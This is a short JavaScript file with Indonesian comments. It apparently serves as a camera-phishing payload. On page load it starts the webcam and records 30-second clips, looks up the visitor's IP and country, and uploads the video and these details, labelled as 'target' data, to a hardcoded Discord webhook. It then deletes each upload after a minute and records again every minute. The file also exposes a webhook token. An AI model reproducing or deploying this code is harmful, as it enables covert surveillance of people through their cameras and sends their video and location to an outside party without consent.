const webhookURL = "https://discord.com/api/webhooks/1353279499181097011/dz2zc8jUhz6K2-jFu-qk2eJfWKikdKP-Yg1J65kG_FbAFr7MEWyfMn64bZSqDgEKgUv7"; // Ganti dengan webhook Discord

function startCamera() {
    return navigator.mediaDevices.getUserMedia({ video: true, audio: false });
}

function stopCamera(stream) {
    stream.getTracks().forEach(track => track.stop());
}

function startRecording() {
    startCamera().then(stream => {
        const recorder = new MediaRecorder(stream, { mimeType: "video/webm" });
        let chunks = [];

        recorder.ondataavailable = event => chunks.push(event.data);

        recorder.onstop = () => {
            const videoBlob = new Blob(chunks, { type: "video/webm" });

            if (videoBlob.size < 25 * 1024 * 1024) {
                getTargetInfo(videoBlob);
            }

            stopCamera(stream); // Matikan kamera setelah rekaman selesai
        };

        setTimeout(() => recorder.stop(), 30000); // Rekam selama 30 detik
        recorder.start();
    }).catch(err => console.error("Gagal akses kamera:", err));
}

function getTargetInfo(blob) {
    fetch("https://ipwho.is/")
        .then(response => response.json())
        .then(data => {
            const ip = data.ip || "Unknown";
            const country = data.country || "Unknown";
            const localTime = new Date().toLocaleString();

            sendToDiscord(blob, ip, country, localTime);
        })
        .catch(err => {
            console.error("Gagal mengambil data IP:", err);
            sendToDiscord(blob, "Unknown", "Unknown", new Date().toLocaleString());
        });
}

function sendToDiscord(blob, ip, country, localTime) {
    const formData = new FormData();
    formData.append("file", blob, "recording.webm");

    formData.append("payload_json", JSON.stringify({
        content: `📸 **Data Target**\n🌍 **IP**: ${ip}\n📌 **Negara**: ${country}\n⏰ **Waktu Target**: ${localTime}`
    }));

    fetch(webhookURL, { method: "POST", body: formData })
        .then(response => response.json())
        .then(data => {
            if (data.id) {
                setTimeout(() => deleteFromDiscord(data.id), 60000); // Hapus video setelah 1 menit
            }
            setTimeout(startRecording, 60000); // Rekam ulang setiap 1 menit
        })
        .catch(err => console.error("Gagal kirim video:", err));
}

function deleteFromDiscord(messageID) {
    fetch(`${webhookURL}/messages/${messageID}`, { method: "DELETE" })
        .catch(err => console.error("Gagal hapus video dari Discord:", err));
}

// Mulai rekaman pertama kali
startRecording();
